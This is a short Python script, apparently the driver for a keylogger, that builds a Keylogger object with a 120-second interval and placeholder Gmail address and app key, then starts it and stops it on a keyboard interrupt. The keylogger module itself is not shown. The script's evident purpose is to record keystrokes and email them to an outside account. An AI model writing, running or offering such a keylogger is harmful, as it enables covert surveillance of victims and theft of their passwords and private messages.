import keylogger

my_keylogger = keylogger.Keylogger(120,"your_mail@gmail.com","email_app_key")
try:
    my_keylogger.start()
except KeyboardInterrupt:
    my_keylogger.stop()
